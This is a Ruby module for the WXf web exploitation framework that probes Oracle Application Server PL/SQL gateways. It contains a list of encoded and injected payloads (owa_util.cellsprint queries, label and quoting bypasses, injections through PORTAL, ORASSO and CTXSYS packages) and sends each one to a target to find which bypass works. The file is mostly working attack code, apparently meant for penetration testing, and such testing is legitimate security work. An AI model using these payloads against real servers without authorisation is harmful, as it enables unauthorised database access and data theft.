
class WebXploit < WXf::WXfmod_Factory::Auxiliary
  
  include WXf::WXfassists::General::MechReq

  def initialize
    super(
      'Name'        => 'Oracle Application Server PL/SQL Injection Tester',
      'Version'     => '1.0',
      'Description' => 'PL/SQL injection tester. Pass path and DAD tries common injection bypasss methods.
                       Pay careful attention to the /\'s in URIPATH and DAD',
      'Author'      => 'CG' ,
      'License'     => WXF_LICENSE,
      'References'  =>
        [
          [ 'URL', 'http://www.owasp.org/index.php/Testing_for_Oracle' ]
        ]
      )
      init_opts([
        OptString.new('URIPATH', [ true,  "The URI PATH", '/pls/']),
        OptString.new('DAD', [ true,  "The Database Access Descriptor", 'portal/'])
      ])
  end

  def run

    checks = [    
      "owa_util.cellsprint?p_thequery=select+1+from+dual",
      "%0Aowa_util.cellsprint?p_thequery=select+1+from+dual",
      "%20owa_util.cellsprint?p_thequery=select+1+from+dual",
      "oaA_util.cellsprint?p_thequery=select+1+from+dual",
      "ow%25%34%31_util.cellsprint?p_thequery=select+1+from+dual",
      "%20owa_util.cellsprint?p_thequery=select+1+from+dual",
      "%09owa_util.cellsprint?p_thequery=select+1+from+dual",
      "S%FFS.owa_util.cellsprint?p_thequery=select+1+from+dual",
      "S%AFS.owa_util.cellsprint?p_thequery=select+1+from+dual",
      "%5CSYS.owa_util.cellsprint?p_thequery=select+1+from+dual",
      "*SYS*.owa_util.cellsprint?p_thequery=select+1+from+dual",
      "\"SYS\".owa_util.cellsprint?p_thequery=select+1+from+dual",
      "<<\"LBL\">>owa_util.cellsprint?p_thequery=select+1+from+dual",
      "<<LBL>>owa_util.cellsprint?p_thequery=select+1+from+dual",
      "<<LBL>>SYS.owa_util.cellsprint?p_thequery=select+1+from+dual",
      "<<\"LBL\">>SYS.owa_util.cellsprint?p_thequery=select+1+from+dual",
      "JAVA_AUTONOMOUS_TRANSACTION.PUSH?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+1+FROM+DUAL",
      "XMLGEN.USELOWERCASETAGNAMES?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+1+FROM+DUAL",
      "PORTAL.wwv_dynxml_generator.show?p_text=<ORACLE>SELECT+1+FROM+DUAL</ORACLE>", 
      "PORTAL.wwv_ui_lovf.show?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+1+FROM+DUAL", #need to test
      "PORTAL.WWV_HTP.CENTERCLOSE?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+1+FROM+DUAL",
      "ORASSO.HOME?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+1+FROM+DUAL",
      "WWC_VERSION.GET_HTTP_DATABASE_INFO?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+1+FROM+DUAL",
      "CTXSYS.DRILOAD.VALIDATE_STMT?SQLSTMT=SELECT+1+FROM+DUAL",
        ]

    path = datahash['URIPATH']
    dad = datahash['DAD']
      
    prnt_gen("Sending requests to #{rurl}#{path}#{dad}\n")
      
    checks.each do | check1|
    
    begin
      res = mech_req({
        'RURL'         => rurl + path + dad + check1, 
        'method'       => 'GET',
        'PROXY_ADDR'   => proxya,
        'PROXY_PORT'   => proxyp,
        'REDIRECT'     => 'false'
      })

      if (res.nil?)
        prnt_err("No response for #{rurl} #{check1}")
      end
      
      if (res) and (res.respond_to?('code')) and (res.code == '200')
        prnt_plus("Received #{res.code} for #{rurl}#{path}#{dad}#{check1}")
      end
      
      if (res) and (res.respond_to?('code')) and (res.code == '302' or res.code == '301')
        prnt_gen("Redirect to #{res.header['location']}")
      end
      
      if (rce)
       prnt_err("Received #{rce_code} for #{check1}")
      end
    end
   end
  end
 end

